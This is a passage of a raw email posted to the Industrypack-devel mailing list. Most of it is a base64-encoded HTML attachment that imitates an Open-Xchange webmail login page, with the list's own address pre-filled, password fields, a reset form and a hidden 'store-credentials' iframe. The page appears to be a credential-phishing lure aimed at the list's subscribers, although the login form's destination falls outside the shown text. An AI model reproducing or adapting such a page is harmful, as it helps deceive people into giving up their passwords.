cGVsbGNoZWNrPSJmYWxzZSIgdHlwZT0iZW1haWwiIHZhbHVlPSJpbmR1c3RyeXBhY2stZGV2ZWxA
bGlzdHMuc291cmNlZm9yZ2UubmV0Ig0KDQovPjwvZGl2Pg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9
InJvdyBwYXNzd29yZCI+DQo8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC14cy0xMiI+PGxhYmVs
IGNsYXNzPSJzci1vbmx5Ig0KDQpkYXRhLWkxOG49IlBhc3N3b3JkIiBmb3I9InBhc3N3b3JkIj5Q
YXNzd29yZDwvbGFiZWw+IDxpbnB1dA0KDQphcmlhLXJlcXVpcmVkPSJ0cnVlIiBhdXRvY2FwaXRh
bGl6ZT0ibm9uZSIgYXV0b2NvcnJlY3Q9Im9mZiINCg0KYXV0b2ZvY3VzPSIiIGNsYXNzPSJmb3Jt
LWNvbnRyb2wiIGRhdGEtaTE4bj0iUGFzc3dvcmQiIGRhdGEtDQoNCmkxOG4tYXR0cj0icGxhY2Vo
b2xkZXIiIGlkPSJpby1veC1sb2dpbi1wYXNzd29yZCINCg0KbWF4bGVuZ3RoPSIxMDAiIG5hbWU9
InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiDQoNCnJlcXVpcmVkPSIiIHR5cGU9InBh
c3N3b3JkIiAvPjwvZGl2Pg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InJvdyBwYXNzd29yZC1yZXR5
cGUiPg0KPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wteHMtMTIiPjxsYWJlbCBjbGFzcz0ic3It
b25seSINCg0KZGF0YS1pMThuPSJDb25maXJtIG5ldyBwYXNzd29yZCIgZm9yPSJwYXNzd29yZDIi
PkNvbmZpcm0gbmV3DQoNCnBhc3N3b3JkPC9sYWJlbD4gPGlucHV0IGFyaWEtcmVxdWlyZWQ9InRy
dWUiDQoNCmF1dG9jYXBpdGFsaXplPSJub25lIiBhdXRvY29ycmVjdD0ib2ZmIiBjbGFzcz0iZm9y
bS1jb250cm9sIg0KDQpkYXRhLWkxOG49IkNvbmZpcm0gbmV3IHBhc3N3b3JkIiBkYXRhLWkxOG4t
YXR0cj0icGxhY2Vob2xkZXIiDQoNCmlkPSJpby1veC1yZXR5cGUtcGFzc3dvcmQiIG1heGxlbmd0
aD0iMTAwIiBuYW1lPSJwYXNzd29yZDIiDQoNCnBsYWNlaG9sZGVyPSJDb25maXJtIG5ldyBwYXNz
d29yZCIgdHlwZT0icGFzc3dvcmQiIC8+PC9kaXY+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0icm93
IGZlZWRiYWNrIj4NCjxkaXYgY2xhc3M9ImNvbC14cy0xMiIgaWQ9ImlvLW94LWxvZ2luLWZlZWRi
YWNrIj4mbmJzcDs8L2Rpdj4NCjwvZGl2Pg0KDQo8ZGl2IGNsYXNzPSJyb3cgb3B0aW9ucyI+DQo8
ZGl2IGNsYXNzPSJjb2wtc20tNiBjb2wteHMtMTIgY2hlY2tib3giIGlkPSJpby1veC1sb2dpbi0N
Cg0Kc3RvcmUiPjxsYWJlbCBhcmlhLWxhYmVsPSJTdGF5IHNpZ25lZCBpbiIgZGF0YS1pMThuPSJT
dGF5DQoNCnNpZ25lZCBpbiIgZGF0YS1pMThuLWF0dHI9ImxhYmVsLGFyaWEtbGFiZWwiIGZvcj0i
aW8tb3gtDQoNCmxvZ2luLXN0b3JlLWJveCI+PGlucHV0IGNoZWNrZWQ9ImNoZWNrZWQiIGlkPSJp
by1veC1sb2dpbi0NCg0Kc3RvcmUtYm94IiBuYW1lPSJzdG9yZSIgdHlwZT0iY2hlY2tib3giIHZh
bHVlPSIxIiAvPiBTdGF5DQoNCnNpZ25lZCBpbiA8L2xhYmVsPjwvZGl2Pg0KDQo8ZGl2IGNsYXNz
PSJjb2wtc20tNiBjb2wteHMtMTIgcmFkaW8gdGV4dC1yaWdodCIgaWQ9ImlvLW94LQ0KDQpmb3Jn
b3QtcGFzc3dvcmQiPjxhIGRhdGEtaTE4bj0iRm9yZ290IHlvdXIgcGFzc3dvcmQ/Ig0KDQpocmVm
PSIjIiB0YXJnZXQ9Il9ibGFuayI+Rm9yZ290IHlvdXIgcGFzc3dvcmQ/PC9hPjwvZGl2Pg0KPC9k
aXY+DQoNCjxkaXYgY2xhc3M9InJvdyBidXR0b25zIj4NCjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAg
Y29sLXNtLTYgY29sLXhzLTEyIj48aW5wdXQgY2xhc3M9ImJ0bg0KDQpidG4tcHJpbWFyeSBmb3Jt
LWNvbnRyb2wiIGlkPSJpby1veC1sb2dpbi1idXR0b24iDQoNCm5hbWU9InNpZ25pbiIgdHlwZT0i
c3VibWl0IiB2YWx1ZT0iU2lnbiBpbiIgLz48L2Rpdj4NCjwvZGl2Pg0KPC9mb3JtPg0KDQo8Zm9y
bSBhY3Rpb249Ii9hcHBzdWl0ZS9hcGkvc2hhcmUvcmVzZXQvcGFzc3dvcmQiIGlkPSJpby1veC0N
Cg0KcGFzc3dvcmQtZm9yZ2V0LWZvcm0iIG1ldGhvZD0iZ2V0IiBub3ZhbGlkYXRlPSIiDQoNCnN0
eWxlPSJkaXNwbGF5Om5vbmU7Ij4NCjxkaXYgY2xhc3M9InJvdyBoZWxwIj4NCjxkaXYgY2xhc3M9
ImNvbC14cy0xMiI+DQo8cCBjbGFzcz0iaGVscC1ibG9jayI+Jm5ic3A7PC9wPg0KPC9kaXY+DQo8
L2Rpdj4NCg0KPGRpdiBjbGFzcz0icm93IGVtYWlsIj4NCjxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAg
Y29sLXhzLTEyIj48bGFiZWwgY2xhc3M9InNyLW9ubHkiDQoNCmRhdGEtaTE4bj0iRW1haWwiIGZv
cj0iaW8tb3gtbG9naW4tcmVzdG9yZW1haWwiPkVtYWlsPC9sYWJlbD4NCg0KPGlucHV0IGFyaWEt
cmVxdWlyZWQ9InRydWUiIGF1dG9jYXBpdGFsaXplPSJub25lIg0KDQphdXRvY29ycmVjdD0ib2Zm
IiBjbGFzcz0iZm9ybS1jb250cm9sIiBkYXRhLWkxOG49IkVtYWlsDQoNCmFkZHJlc3MiIGRhdGEt
aTE4bi1hdHRyPSJwbGFjZWhvbGRlciIgaWQ9ImlvLW94LWxvZ2luLQ0KDQpyZXN0b3JlbWFpbCIg
bWF4bGVuZ3RoPSIxMDAwIiBuYW1lPSJyZXN0b3JlbWFpbCINCg0KcGxhY2Vob2xkZXI9IkVtYWls
IiBzcGVsbGNoZWNrPSJmYWxzZSIgdHlwZT0iZW1haWwiIC8+PC9kaXY+DQo8L2Rpdj4NCg0KPGRp
diBjbGFzcz0icm93IGJ1dHRvbiI+DQo8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1zbS02IGNv
bC14cy0xMiI+PGlucHV0IGNsYXNzPSJidG4NCg0KYnRuLXByaW1hcnkgZm9ybS1jb250cm9sIiBk
YXRhLWkxOG49Ik5leHQiIGRhdGEtaTE4bi0NCg0KYXR0cj0idmFsdWUsYXJpYS1sYWJlbCIgaWQ9
InJlc2V0cGFzc3dvcmQtYnV0dG9uIg0KDQpuYW1lPSJyZXNldHBhc3N3b3JkIiB0eXBlPSJzdWJt
aXQiIHZhbHVlPSJSZXNldCBteSBwYXNzd29yZCINCg0KLz48L2Rpdj4NCg0KPGRpdiBjbGFzcz0i
Y29sLXNtLTYgY29sLXhzLTEyIHRleHQtcmlnaHQiIGlkPSJpby1veC0NCg0KYmFja3Rvc2lnbmlu
Ij48YSBkYXRhLWkxOG49IkJhY2sgdG8gc2lnbiBpbiIgaHJlZj0iIyINCg0KdGFyZ2V0PSJfYmxh
bmsiPkJhY2sgdG8gc2lnbiBpbjwvYT48L2Rpdj4NCjwvZGl2Pg0KPC9mb3JtPg0KPC9kaXY+DQo8
L2Rpdj4NCg0KPGZvb3RlciBpZD0iaW8tb3gtbG9naW4tZm9vdGVyIj4mbmJzcDs8L2Zvb3Rlcj4N
CjwvZGl2Pg0KPC9kaXY+DQoNCjxkaXYgaWQ9ImlvLW94LW9mZmxpbmUiIHN0eWxlPSJib3R0b206
IC00MXB4OyBkaXNwbGF5Og0KDQpub25lOyI+Jm5ic3A7PC9kaXY+DQoNCjxkaXYgYXJpYS1saXZl
PSJwb2xpdGUiIGNsYXNzPSJzci1vbmx5IiBpZD0iaW8tb3gtYWxlcnQtDQoNCnNjcmVlbnJlYWRl
ciIgcm9sZT0iYWxlcnQiPiZuYnNwOzwvZGl2Pg0KDQo8ZGl2IGlkPSJ0bXAiIHN0eWxlPSJkaXNw
bGF5OiBub25lOyI+PGlmcmFtZSBuYW1lPSJzdG9yZS0NCg0KY3JlZGVudGlhbHMiIHNyYz0iamF2
YXNjcmlwdDpmYWxzZSI+PC9pZnJhbWU+PC9kaXY+DQo8c3ZnIHN0eWxlPSJoZWlnaHQ6MDsiPjxm
aWx0ZXIgaWQ9Im92ZXJsYXktDQoNCmVmZmVjdCI+PGZlZ2F1c3NpYW5ibHVyDQoNCnN0ZGRldmlh
dGlvbj0iMiI+PC9mZWdhdXNzaWFuYmx1cj48L2ZpbHRlcj48L3N2Zz4NCg0KPHA+Jm5ic3A7PC9w
Pg0KDQo8cD4mbmJzcDs8L3A+DQoNCjxwPiZuYnNwOzwvcD4NCg0KPHA+Jm5ic3A7PC9wPg0KDQo8
cD4mbmJzcDs8L3A+DQoNCjxwPiZuYnNwOzwvcD4NCg0KPHA+Jm5ic3A7PC9wPg0KDQo8cD48c2Ny
aXB0IHNyYz0idj03LjguMC0NCg0KNi4yMDE1MTAwNi4wNzQ4MjkvYm9vdC5qcyI+PC9zY3JpcHQ+
PG5vc2NyaXB0Pg0KPHAgY2xhc3M9Im5vc2NyaXB0Ij5UaGlzIGFwcCB1c2VzIEphdmFTY3JpcHQu
IFlvdXIgYnJvd3Nlcg0KDQplaXRoZXIgZG9lc24ndCBzdXBwb3J0IEphdmFTY3JpcHQgb3IgeW91
IGhhdmUgaXQgdHVybmVkIG9mZi4NCg0KVG8gdXNlIHRoaXMgYXBwIHBsZWFzZSB1c2UgYSBKYXZh
U2NyaXB0IGVuYWJsZWQgYnJvd3Nlci48L3A+DQo8IS0tIHNlZSBidWcgIzI3NjA4IGFuZCAjMjY3
MjIgLS0+DQo8L25vc2NyaXB0PjxzY3JpcHQgc3JjPSJ2PTcuOC4wLTYuMjAxNTEwMDYuMDc0ODI5
L3ByZWNvcmUuanMiDQoNCmRlZmVyPSJkZWZlciI+PC9zY3JpcHQ+PC9wPg0KDQo8cD4mbmJzcDs8
L3A+DQoNCjxwPiZuYnNwOzwvcD4NCg0KPHA+Jm5ic3A7PC9wPg0KDQo8cD4mbmJzcDs8L3A+DQoN
CjxwPiZuYnNwOzwvcD4NCg0KPHA+Jm5ic3A7PC9wPg0KDQo8cD4mbmJzcDs8L3A+DQo=

--uGgFpx6HkfhH6XmyJL=_nx2IjqGVRj6ner
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--uGgFpx6HkfhH6XmyJL=_nx2IjqGVRj6ner
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--uGgFpx6HkfhH6XmyJL=_nx2IjqGVRj6ner--


